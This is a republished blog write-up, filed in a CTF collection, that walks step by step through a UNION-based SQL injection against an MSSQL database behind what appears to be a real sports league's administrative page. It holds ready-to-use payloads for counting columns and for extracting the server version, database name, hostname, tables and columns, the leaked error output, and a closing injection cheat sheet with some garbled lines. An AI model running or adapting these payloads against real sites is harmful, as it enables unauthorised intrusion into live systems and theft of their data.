# :game_die: Fun Sql Injection 2 Mssql F2F3C83D0Cf8

> **Original Source:** [Fun Sql Injection 2 Mssql F2F3C83D0Cf8](https://infosecwriteups.com/fun-sql-injection-2-mssql-f2f3c83d0cf8)
> **Platform:** infosecwriteups.com | **Category:** `MISC`

---

Going back to the vulnerable site, it has 47 columns


```
site/ejemplo/parametro[=-25527](https://administrador.ligamx.net/php/cmpt/CMPT_InfrArbt.php?pnIDPartido=25527) UNION SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35,36,37,38,39,40,41,42,43,44,45,46,47 --
```


As we can see, adding a union select with the 47 columns changes the error message and the most interesting thing is that we see 2 numbers that are inside the red circle.


These numbers are the vulnerable columns, and it is in them where we are going to introduce the sentences to display the information from the database!


```
site/ejemplo/parametro[=-25527](https://administrador.ligamx.net/php/cmpt/CMPT_InfrArbt.php?pnIDPartido=25527) UNION SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,'_Y000_ LuisMadero',26,27,28,29,30,31,32,33,34,35,36,37,38,39,40,41,42,43,44,45,46,47 --
```


As we can see, column number 25 allows us to write and receive data from the database and with that column we will work!


## Get _Y000_’s stories in your inbox


Join Medium for free to get updates from this writer.


Remember me for faster sign in


Version


```
site/ejemplo/parametro[=-25527](https://administrador.ligamx.net/php/cmpt/CMPT_InfrArbt.php?pnIDPartido=25527) UNION SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,@@version,26,27,28,29,30,31,32,33,34,35,36,37,38,39,40,41,42,43,44,45,46,47 --
```


```
message: Error de conversión al convertir el valor nvarchar 'Microsoft SQL Server 2008 R2 (RTM) - 10.50.1600.1 (X64)
Apr 2 2010 15:48:46
Copyright (c) Microsoft Corporation
Standard Edition (64-bit) on Windows NT 6.1 &lt;X64&gt; (Build 7601: Service Pack 1)
' al tipo de datos smallint. (severity 16)
```


Now we have the version of the database!


Database


```
site/ejemplo/parametro[=-](https://administrador.ligamx.net/php/cmpt/CMPT_InfrArbt.php?pnIDPartido=25527)25527 UNION SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,(select top 1 name FROM master..sysdatabases),26,27,28,29,30,31,32,33,34,35,36,37,38,39,40,41,42,43,44,45,46,47--
```


Now, to get the name of the database I am using:


```
(select top 1 name FROM master..sysdatabases)
```


Since the syntax of the vulnerable function of the database does not allow me to reflect more than one value, nor concatenating.


As a result it gives me that the name of the database is “ADPR”.


@@Servername


To know this value we only use the following payload


```
-25527UNION SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,@@SERVERNAME,26,27,28,29,30,31,32,33,34,35,36,37,38,39,40,41,42,43,44,45,46,47
```


List Tables


To list the tables it was a bit difficult to find a payload since, as I mentioned before, this database does not allow me to show more than one result at the same time, with this payload:


```
-25527UNION SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,table_name,26,27,28,29,30,31,32,33,34,35,36,37,38,39,40,41,42,43,44,45,46,47 from (select top 1 table_name from information_schema.tables order by 1) as a order by 1 desc--
```


We are using “top 1” to list that table, in this case the number 1 represents table number 1 in that database.


in this case. the table is called “_CDLA_Partidos”


List Columns


For this we use a variant of the previous payload, but now we are focusing on enumerating the columns of that Table.


```
-25527UNION SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,column_name,26,27,28,29,30,31,32,33,34,35,36,37,38,39,40,41,42,43,44,45,46,47 from (select top 1 column_name from information_schema.columns where table_name='_CDLA_Partidos' order by 1) as 1 order by 1 desc--
```


Following the same logic, changing the number of “top” shows us the next column.


The name of the first column is called “Prtd_IDPartidos”

>

*NOTE: I’ll leave this injection until here and won’t show as much information as I don’t want to compromise the site. The names of the tables and columns say a lot …*MSSQL SQL INJECTION CHEAT-CHEET


```
-- : Comment Type 1
--+ : Comment Type 2
--+- : SQL Comment
// : Inline Comment
;%00 : Null Byte@@version : Current Version
user_name() : Current User
user : Current User
db_name() : Current Database
@@SERVERNAME : HostnameTablesunion select table_name from (select top 1 table_name from information_schema.tables order by 1) as 1 order by 1 desc--Columnsunion select column_name from (select top 1 column_name from information_schema.columns where table_name='table' order by 1) as 1 order by 1 desc--Dump infounion select culumn form table--
```

---

*Originally published on [Medium](https://infosecwriteups.com/fun-sql-injection-2-mssql-f2f3c83d0cf8). All credit goes to the original author.*
*Part of [CTF Collection](https://github.com/Hope0351/CTF-collection) — a curated archive of misc CTF writeups.*
